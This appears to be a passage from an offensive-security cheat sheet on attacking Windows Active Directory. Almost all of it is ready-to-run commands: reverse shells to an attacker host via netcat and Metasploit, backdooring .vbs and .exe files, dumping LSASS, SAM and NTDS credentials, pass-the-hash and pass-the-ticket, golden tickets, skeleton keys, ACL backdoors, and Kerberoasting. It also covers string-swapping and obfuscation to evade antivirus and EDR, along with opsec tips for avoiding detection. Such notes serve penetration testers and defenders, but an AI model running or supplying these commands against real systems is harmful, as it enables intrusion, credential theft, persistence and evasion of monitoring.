2. `smbclient -c 'put <local_file_path>' -U <username> -W <domain> '//<target_ip_or_hostname>/<share_name>/'`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"`
4. `nc -lvp <listening_port>`

From the new shell on the listener
5. `runas /netonly /user:<domain>\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe <attacker_ip> <attacker_port>"`
6. `sc.exe \\<target_ip_or_hostname> create <service_name> binPath= "<path_to_executable>" start= auto`
7. `sc.exe \\<target_ip_or_hostname> start <service_name>`


### Backdooring .vbs Scripts
- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\<your_share_IP>\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

### Backdooring .exe Files
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

### RDP hijacking
1. Run `cmd` as Administrator
2. `PsExec64.exe -s cmd.exe`
3. List server's sessions with '`query user`'
4. Use `tscon.exe` and specify the `session ID` we will be taking over, as well as our current `SESSIONNAME`
   - `tscon 3 /dest:rdp-tcp#6`
   
### SSH Remote Port Forwarding
- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
- Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

### SSH Local Port Forwarding (to expose attacker's port 80)

Victim
1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
2. ```Powershell
   add firewall rule
   netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
   ```
   
### Port Forwarding With socat
1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
   ```Powershell
   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
   ```
2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
- Example
  ```Powershell
  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
  ```

### Dynamic Port Forwarding and SOCKS
- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
- Attacker: 
  1. `[ProxyList] socks4  127.0.0.1 9050`
  2. `proxychains curl http://<target_ip_or_domain>`

### Rejetto HFS
1. `ssh <user>@<host> -R 8888:<remote_target_host>:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N`
2. `windows/http/rejetto_hfs_exec`
- Get it here: [rejetto.com/hfs/](https://www.rejetto.com/hfs/)
- See: [Task 7 "Tunnelling Complex Exploits"](https://tryhackme.com/room/lateralmovementandpivoting)

### PsExec
```PowerShell
./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```
Requirements
- The user that authenticates to the target machine needs to be part of the Administrators local group
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on

Note:
- `psexec.exe` is very noisy. If you can, use PSRemoting instead


### Extracting Credentials from LSASS

- Note: Avoid LSASS, search credentials there just if you are desperate. Search in “credentials vault” e “DPAPI”.
- Dump credentials on a local machine using Mimikatz:
  `Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
- Using [SafetyKatz](https://github.com/GhostPack/SafetyKatz) (Minidump of lsass and PELoader to run Mimikatz):
  `SafetyKatz.exe "sekurlsa::ekeys"`
- Dump credentials Using [SharpKatz](https://github.com/b4rtik/SharpKatz):
  `SharpKatz.exe --Command ekeys`
- Dump credentials using [Dumpert](https://github.com/outflanknl/Dumpert) (Direct System Calls and API unhooking):
  `rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump`
- Using [pypykatz](https://github.com/skelsec/pypykatz) (Mimikatz functionality in Python):
  `pypykatz.exe live lsa`
- Using comsvcs.dll:
  `tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full`
- From a Linux attacking machine using impacket
- From a Linux attacking machine using Physmem2profit


### Pass the Hash
```PowerShell
/usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
```

1. Extract hashes
   ```PowerShell
   lsadump::sam
   sekurlsa::msv
   ```
3. Perform the PtH
   ```PowerShell
   token::revert
   sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<ntlm_hash> /run:"c:\tools\nc64.exe -e cmd.exe <attacker_ip> 5555"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:<target_host> cmd
   ```

Requirements
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- The attacker must present valid credentials with local administrative permission

### Pass the Key / Overpass-the-Hash

1. Run the Notepad with `Run as different user` to cache the credentials on the machine
2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
3. Now, in mimikatz, execute the command `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell` to run a PowerShell
4. Authenticate to a network share of the target `net use \\<target>`
5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
6. Now you can run `.\PsExec.exe \\<target> cmd`

Process
1. `sekurlsa::ekeys` 
2. RC4 hash
   ```PowerShell
   sekurlsa::pth /user:<username> /domain:<domain> /rc4:<rc4_hash> /run:"c:\tools\nc64.exe -e cmd.exe <attacker_ip> 5556"
   AES128 hash
   sekurlsa::pth /user:<username> /domain:<domain> /aes128:<aes128_hash> /run:"c:\tools\nc64.exe -e cmd.exe <attacker_ip> 5556"
   AES256 hash
   sekurlsa::pth /user:<username> /domain:<domain> /aes256:<aes256_hash> /run:"c:\tools\nc64.exe -e cmd.exe <attacker_ip> 5556"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:<remote_host> cmd
   ```

Other way:
- Start a PowerShell session with a logon type 9 (same as runas /netonly) with `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<domain> /aes256:<aes256key> /run:powershell.exe"'`
- With Rubeus.exe
  - Without elevation, run the command: `Rubeus.exe asktgt /user:Administrator /rc4:<ntlmhash> /ptt`
  - With elevation, run the command: `Rubeus.exe asktgt /user:Administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
- To extract credentials without code execution, use DCSync
  - To use the DCSync feature for getting krbtgt hash, use `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'` or `SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
  - Note: by default, Domain Admins privileges are required to run DCSync

### Pass the Ticket

1. Run mimikatz. Execute `#privilege::debug`
2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
5. Inspect the injected ticket with `C:\> klist`
6. Access the restricted shared folder.
   - Example `dir \\<IP>\admin$`

### DCOM

1. `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))` remotely Instantiate the MMC Application object
2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")` execute a command on the remote DCOM object
3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`


## Credentials Harvesting

### Cedential Access

Clear-text files
- `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Database files
- `cd C:\ProgramData\McAfee\Agent\DB > ma.db > sqlitebrowser ma.db`
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)

Memory
- Clear-text credentials
- Cached Passwords
- AD Tickets

Password managers
- example: `*.kdbx`

Enterprise Vaults

Active Directory
- Users' description
- Group Policy SYSVOL
- NTDS
- AD Attacks

Network Sniffing

Registry
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`


Years ago you could find clear-text password in the GPP, so give it a shot. If it’s a new enviorments it won’t probably work tho.


### Windows Credentials

- Keystrokes (keyscan_start / keyscan_stop)
- `copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\`
- `meterpreter > hashdump`

Shadow Copy Service
1. `wmic shadowcopy call create Volume='C:\'`
2. `vssadmin list shadows`
3. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam`
4. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system`

Registry Hives
1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`

Now, you can decrypt
- copy the files with `scp <username>@<remoteHost>:/remote/dir/file.txt /local/dir/`
- `impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL`


### Dump LSASS

GUI
1. Open Task Manager
2. Search for `lsass.exe` > right click "Create dump file"
3. `copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP`

Mimikatz
1. `privilege::debug`
2. `sekurlsa::logonpasswords`

Protected LSASS
1. `privielege::debug`
2. `!+`
3. `!processprotect /process:lsass.exe /remove`
4. `sekurlsa::logonpasswords`
   
   
### Accessing Credential Manager

1. `vaultcmd /list`
2. `VaultCmd /listproperties:"Web Credentials"`
3. `VaultCmd /listcreds:"Web Credentials"`

RunAs
1. `cmdkey /list`
2. If it's not empty
   - `runas /savecred /user:<domain>\<username> cmd.exe`
   
Mimikatz
1. `privilege::debug`
2. `sekurlsa::credman`


### Domain Controller

1. `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
2. `impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local`
3. `impacket-secretsdump -just-dc <domain>/<AD_Admin_User>@<IP>`
   - `impacket-secretsdump -just-dc-ntlm <domain>/<AD_Admin_User>@<IP>`
4. `hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`


### Local Administrator Password Solution (LAPS)

1. Verify if there is LAPS in the machine
   - `dir "C:\Program Files\LAPS\CSE"`
2. `Get-Command *AdmPwd*`
3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
   - `Find-AdmPwdExtendedRights -Identity THMorg`
   - `Find-AdmPwdExtendedRights -Identity *`
4. Check the group and its members
   - `net groups "<TARGET GROUP>"`
   - `net user <test-admin>`
5. Compromise one of those accounts, get the password
   - `runas.exe /netonly /user:<username> cmd.exe`
   - `Get-AdmPwdPassword -ComputerName <creds-harvestin>`
   
### Rubeus Harvesting

- `Rubeus.exe harvest /interval:30`

## Offensive .NET

- When working with .NET (or any compiled language), several obstacles may arise:
  - Detection by defensive measures such as antivirus (AV) and endpoint detection and response (EDR) solutions;
  - Payload delivery, reminiscent of PowerShell's efficient download-execute cradles;
  - Detection through logging mechanisms like process creation and command-line logging.
- Note: Microsoft Defender for Endpoint (MDE) detection is okay, Microsoft Defender for Identity (MDI) is not.

### String Manipulation

Tools
- [DefenderCheck](https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that Windows Defender may flag
- [ConfuserEx](https://github.com/mkaring/ConfuserEx) to obfuscate a binary
- [Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)
- [NetLoader](https://github.com/Flangvik/NetLoader)

For the Sharpkatz binary
1. Run `DefenderCheck.exe <Path to Sharpkatz binary>`
2. Open the project in Visual Studio
3. Press "CTRL + H"
4. Find and replace the string "Credentials" with "Credents" or any other string
5. Scope -> "Entire Solution"
6. Press "Replace All"
7. Build and recheck with DefenderCheck
8. Repeat until there is no detection

For SafetyKatz
1. Run Out-CompressedDll.ps1 on Mimikatz and save the output
   - `Out-CompressedDll <mimikatz.exe> > outputfilename.txt`
2. Retrieve the value of the variable "$EncodedCompressedFile" from the output file, and substitute it for the value of the "compressedMimikatzString" variable in the "Constants.cs" file of SafetyKatz
3. Take the byte size from the output file and replace it into lines 111 and 116 of the "Program.cs" file.

For BetterSafetyKatz
1. Use BetterSafetyKatz to download mimikatz_trunk.zip
2. Convert it in base64
   - `$filename = "D:\file\path\to\mimikatz_trunk.zip"`
   - `[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip`
3. Modify the "Program.cs" file
   - Add a new variable holding the base64 value of the "mimikatz_trunk.zip" file.
   - Comment out the sections of code that downloads or accept the mimikatz file as an argument.
   - Convert the base64 string to bytes and assign it to the "zipStream" variable.

For Rubeus.exe
1. Run ConfuserEx
2. In Project tab
   - Select the Base Directory where the binary file is located
   - Choose the Binary File to obfuscate
3. Go to the Settings tab to insert the rules
   - Modify the rule and select the preset as 'Normal'
4. Move to the Protect tab and click on the protect button
5. The newly obfuscated binary will be located in the Confused folder within the specified Base Directory

Payload Delivery
- Use NetLoader to load binaries from either filepath or URL and concurrently patch AMSI and ETW during execution
  - `C:\file\path\to\Loader.exe -path http://<IP>/SafetyKatz.exe`
- Use AssemblyLoad.exe to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL
  - `C:\file\path\to\AssemblyLoad.exe http://<IP>/Loader.exe -path http://<IP>/SafetyKatz.exe`


## Active Directory Persistence

### Golden Ticket

- Note: prefeer Silver Ticket instead. Short time, but less detection.
- With this attack, you can gain access to every machine in the AD
- You need a kerberoast ticket granting account and With mimikatz from the DC
- You may need to purge: `kerberos::purge`
- See this if you are having trouble: [Mimikatz 2.0 - Golden Ticket Walkthrough](https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html)

Process
1. `privilege::debug`
2. Dump the krbtgt hash
   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
   - copy the SID and the NTLM
3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
4. `misc::cmd`
5. from the opened CMD, try `dir \\USERNAME\\C$`
   - consider also to download psexec in the machine compromised for more access
   - `psexec.exe \\USERNAME cmd.exe`

### Diamond ticket

- Create a diamond ticket using Rubeus (note that RC4 or AES keys of the user can be used too): `Rubeus.exe diamond /krbkey:<krb_key> /user:<user> /password:<password> /enctype:<encryption_type> /ticketuser:<ticket_user> /domain:<domain> /dc:<domain_controller> /ticketuserid:<ticket_user_id> /groups:<groups> /createnetonly:<command_to_execute> /show /ptt`
- Use `/tgtdeleg` option in place of credentials `/user: /password:` in case we have access as a domain user

### Skeleton Key

Notes
- It enables you to access any user by using a valid username with the skeleton key as password.
- It's not opsec safe and is also known to cause issues with AD CS (it can crash the enviorment for everybody)
- If you use mimikatz, change the password used by it.

Process
1. `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <target_computer_name>`
2. `Enter-PSSession -Computername <target_computer_name> -credential <domain>\<username>`

In case lsass is running as a protected process (PPS), it needs the mimikatz driver (mimidriv.sys) on disk of the target DC (very noisy in logs - Service installation (Kernel mode driver))
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

### Shadow copies

1. `vshadow.exe -nw -p  C:` perform a shadow copy of the `C:` drive
2. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` copy the ntds database to the C: drive
3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials

### Through Credentials

1. DCSync All with mimikatz
   - `privilege::debug`
   - `log <username>_dcdump.txt`
   - `lsadump::dcsync /domain:<domain_name> /all`
2. `cat <username>_dcdump.txt | grep "SAM Username"`
3. `cat <username>_dcdump.txt | grep "Hash NTLM"`
- You can also target only one user with the following command
  - `lsadump::dcsync /domain:<domain> /user:<Your low-privilege AD Username>`

### Through Certificates

1. See certificates stored
   - `crypto::certificates /systemstore:local_machine`
2. Patch memory to make these keys exportable
   - `crypto::capi`
   - `crypto::cng`
3. Export the certificates
   - `crypto::certificates /systemstore:local_machine /export`
4. Generate certificates
   - `ForgeCert.exe --CaCertPath <CA_cert_path> --CaCertPassword <CA_cert_password> --Subject CN=User --SubjectAltName <subject_alt_name> --NewCertPath <new_cert_path> --NewCertPassword <new_cert_password>`
5. Use Rubeus to request a TGT using the certificate
   - `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<certificate_path> /password:<password> /outfile:administrator.kirbi /domain:<domain> /dc:<dc_ip>`
6. Load the TGT to auth to DC, with mimikatz
   - `kerberos::ptt administrator.kirbi`

### Trough SID History

- If you need to fix SID history (ntds.dit): [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
1. Confirm that your user has no SID history
   - `Get-ADUser <your ad username> -properties sidhistory,memberof`
2. Get the SID of the Domain Admins
   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
3. Patch the ntds.dit file with DSInternals
   - `Stop-Service -Name ntds -force`
   - `Stop-Service -Name ntds -force`
   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
   - `Start-Service -Name ntds`
   - `Restart-Service -Name NTDS`
4. Exit and Log in, verify the SID history
   - `Get-ADUser <username> -Properties sidhistory`
5. Test your Admin privileges
   - `dir \\<IP_or_name>\c$`

### Trough metasploit

1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
2. `use exploit/multi/handler`
3. `set payload windows/meterpreter/reverse_tcp`
4. after the shell is spawned: `background`
5. `use exploit/windows/local/persistence`
6. `set settion 1`
7. `run`
- If the session dies, just run again `run`
- [About Post-Exploitation](https://docs.rapid7.com/metasploit/about-post-exploitation/)

### DSRM

DSRM is Directory Services Restore Mode. There is a local administrator on every DC called "Administrator" whose password is the DSRM password. This is changed rarely and only manually. This is the longest persistence mechanism.

1. Dump DSRM password (needs DA privs): `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <DC_IP>`
2. Change the logon behavior: `Enter-PSSession -Computername <DC_IP> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
3. Pass the Hash: `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DOMAIN_NAME> /user:Administrator /ntlm:<NTLM_HASH> /run:powershell.exe"'`
4. `ls \\<DC_IP>\C$`

### Custom SSP

One reason because these techniques are talked is, yes are noisy but they are gonna be tested by real attackers (not all organizations are going to be targetted by ATPs or States)

- Drop the `mimilib.dll` to `system32` and add `mimilib` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security` Packages:
  ```
  $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
  $packages += "mimilib"
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
  ```
- Inject into lsass (usable with Server 2019 and 2022 but not stable ): `Invoke-Mimikatz -Command '"misc::memssp"'`
- All local logons on the DC are logged to `C:\Windows\system32\mimilsa.log`

### ACLs - AdminSDHolder

- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
  - `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DC_NAME>,<DC_EXTENSION>' -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN_NAME> -TargetDomain <DOMAIN_NAME> -Verbose`
- Using ActiveDirectory Module and [RACE toolkit](https://github.com/samratashok/RACE):
   - `Set-DCPermissions -Method AdminSDHolder -SAMAccountName <USER> -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=<DC_NAME>,DC=<DC_EXTENSION>' -Verbose`
- Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:
  - `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DC_NAME>,<DC_EXTENSION>' -PrincipalIdentity <USER> -Rights ResetPassword -PrincipalDomain <DOMAIN_NAME> -TargetDomain <DOMAIN_NAME> -Verbose`
  - `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DC_NAME>,<DC_EXTENSION>' -PrincipalIdentity <USER> -Rights WriteMembers -PrincipalDomain <DOMAIN_NAME> -TargetDomain <DOMAIN_NAME> -Verbose`
- Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
  - `Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`
- For pre-Server 2008 machines:
  - `Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose`
- Check the Domain Admins permission - PowerView as normal user:
  - `Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$} | ?{$_.IdentityName -match "<USER>"}`
- Using ActiveDirectory Module:
  - `(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=<DC_NAME>,DC=<DC_EXTENSION>').Access | ?{$_.IdentityReference -match '<USER>'}`
- Abusing FullControl using PowerView: 
  - `Add-DomainGroupMember -Identity 'Domain Admins' -Members <TEST_USER> -Verbose`
- Using ActiveDirectory Module:
  - `Add-ADGroupMember -Identity 'Domain Admins' -Members <TEST_USER>`
- Abusing ResetPassword using PowerView:
  - `Set-DomainUserPassword -Identity <TEST_USER> -AccountPassword (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force) -Verbose`
- Using ActiveDirectory Module:
  - `Set-ADAccountPassword -Identity <TEST_USER> -NewPassword (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force) -Verbose`

### ACLs - Rights Abuse

- Add FullControl rights:
  - `Add-DomainObjectAcl -TargetIdentity 'DC=<DC_NAME>,DC=<DC_EXTENSION>' -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN_NAME> -TargetDomain <DOMAIN_NAME> -Verbose`
- Using ActiveDirectory Module and [RACE](https://github.com/samratashok/RACE):
  - `Set-ADACL -SamAccountName <USER> -DistinguishedName 'DC=<DC_NAME>,DC=<DC_EXTENSION>' -Right GenericAll -Verbose`
- Add rights for DCSync:
  -`Add-DomainObjectAcl -TargetIdentity 'DC=<DC_NAME>,DC=<DC_EXTENSION>' -PrincipalIdentity <USER> -Rights DCSync -PrincipalDomain <DOMAIN_NAME> -TargetDomain <DOMAIN_NAME> -Verbose`
- Using ActiveDirectory Module and RACE:
  - `Set-ADACL -SamAccountName <USER> -DistinguishedName 'DC=<DC_NAME>,DC=<DC_EXTENSION>' -GUIDRight DCSync -Verbose`
- Execute DCSync:
  - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'`
  - or `C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt" "exit"`


### ACLs - Security Descriptors

WMI: Access control lists (ACLs) can be modified to grant permission for securable objects to be accessed by users who are not administrators. Using the RACE toolkit:
- On local machine for <USER>:
  `Set-RemoteWMI -SamAccountName <USER> -Verbose`
- On remote machine for <USER> without explicit credentials:
  `Set-RemoteWMI -SamAccountName <USER> -ComputerName <REMOTE_COMPUTER> -namespace 'root\cimv2' -Verbose`
- On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
  `Set-RemoteWMI -SamAccountName <USER> -ComputerName <REMOTE_COMPUTER> -Credential <CREDENTIALS> -namespace 'root\cimv2' -Verbose`
- On remote machine remove permissions:
  `Set-RemoteWMI -SamAccountName <USER> -ComputerName <REMOTE_COMPUTER> -namespace 'root\cimv2' -Remove -Verbose`

PowerShell Remoting: RACE toolkit - PS Remoting backdoor (not stable after August 2020 patches)
- On local machine for <USER>:
`Set-RemotePSRemoting -SamAccountName <USER> -Verbose`
- On remote machine for <USER> without credentials:
`Set-RemotePSRemoting -SamAccountName <USER> -ComputerName <REMOTE_COMPUTER> -Verbose`
- On remote machine, remove the permissions:
`Set-RemotePSRemoting -SamAccountName <USER> -ComputerName <REMOTE_COMPUTER> -Remove`
- Using RACE or DAMP, with admin privs on remote machine
`Add-RemoteRegBackdoor -ComputerName <REMOTE_COMPUTER> -Trustee <USER> -Verbose`
- As <USER>, retrieve machine account hash:
`Get-RemoteMachineAccountHash -ComputerName <REMOTE_COMPUTER> -Verbose`
- Retrieve local account hash:
`Get-RemoteLocalAccountHash -ComputerName <REMOTE_COMPUTER> -Verbose`
- Retrieve domain cached credentials:
`Get-RemoteCachedCredential -ComputerName <REMOTE_COMPUTER> -Verbose`


## Active Directory Privilege Escalation

See also [Windows Privilege Escalation](../system-attacks#windows-privilege-escalation)

### Kerberoasting

- see: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory#kerberoast
- Note: if you have a service account (like `svc_apache`) it's possible to kerberoast
  - see PowerView command `Get-netuser username`

Retrieve TGS
  - `impacket-GetNPUsers -dc-ip <domain_controller_ip> <domain>/<user>:<password>`
  - `impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <domain_controller_ip> -request`
  - Alternatives
    - From a compromised machine: `.\Rubeus.exe kerberoast`, `.\Rubeus.exe kerberoast /nowrap` or `.\Rubeus.exe kerberoast /creduser:<domain>\<username> /credpassword:<password>`
    - `impacket-GetUserSPNs <domain>/<user>:<password> -request`
      - you need to add the domain and IP to /etc/hosts to make this command work

Crack the hash
- `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O`
- `hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
- Note: you can run commands as another user with `runas` or `Invoke-RunasCs.ps1`
  - `Invoke-RunasCs <user_name> <password> 'c:/xampp/htdocs/uploads/shell.exe'`

Another way
- Find user accounts that run Service accounts
  - ActiveDirectory module
    - `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
  - PowerView
    - `Get-DomainUser -SPN`
- Use Rubeus to list Kerberoast stats
  - `Rubeus.exe kerberoast /stats`
- Use Rubeus to request a TGS
  - `Rubeus.exe kerberoast /user:<USER> /simple`
- To evade detection relying on Encryption Downgrade for Kerberos EType (e.g., MDI - where 0x17 stands for rc4-hmac), look for Kerberoastable accounts exclusively supporting RC4_HMAC
  - `Rubeus.exe kerberoast /stats /rc4opsec`
  - `Rubeus.exe kerberoast /user:<USER> /simple /rc4opsec`
- Kerberoast all possible accounts (don’t do it)
  - `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`
- Crack ticket using John the Ripper
  - `john.exe --wordlist=C:\file\path\to\10k-worst-pass.txt C:\file\path\to\hashes.txt`
 
OpSec tip: Test one account at a time, like `Rubeus.exe kerberoast /user:svcadmin /simple`, don’t test it on every user. You could also create a simple script to test an account every 5 sec.

AS-REPs
- Enumerate accounts with Kerberos Preauth disabled
  - Using PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
  - Using ActiveDirectory module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
- Force disable Kerberos Preauth:
  - Enumerate the permissions for RDPUsers on ACLs with PowerView:
    1. `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
    2. `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
    3. `Get-DomainUser -PreauthNotRequired -Verbose`
- Request encrypted AS-REP for offline brute-force
  - Using ASREPRoast
    - `Get-ASREPHash -UserName <USER> -Verbose`
  - Enumerate all users with Kerberos preauth disabled and request a hash
    - `Invoke-ASREPRoast -Verbose`
  - Use John The Ripper to brute-force the hashes offline
    - `john.exe --wordlist=C:\file\path\to\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt`

Set SPN
- With enough rights like GenericAll or GenericWrite, a target user's SPN can be set to anything (unique in the domain)
- Then request a TGS without special privileges. The TGS can then be "Kerberoasted"
- Enumerate the permissions for RDPUsers on ACLs with PowerView
  - `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- With Powerview, see if the user already has a SPN
  - `Get-DomainUser -Identity <user-rdp> | select serviceprincipalname`
- Using ActiveDirectory module
  - `Get-ADUser -Identity <user-rdp> -Properties ServicePrincipalName | select ServicePrincipalName`
- Set a SPN for the user (must be unique for the domain)
  - `Set-DomainObject -Identity <user-rdp> -Set @{serviceprincipalname='<domain>/<user>'}`
- Using ActiveDirectory module
  - `Set-ADUser -Identity <user-rdp> -ServicePrincipalNames @{Add='<domain>/<user>'}`
- Kerberoast the user
  - `Rubeus.exe kerberoast /outfile:<targetedhashes>.txt`
- Use John The Ripper to brute-force the hashes offline
  - `john.exe --wordlist=C:\file\path\to\10k-worst-pass.txt C:\file\path\to\targetedhashes.txt`

### Targeted Kerberoasting

AS-REPs
- Perform AS-REP roasting on Linux using `impacket-GetNPUsers`
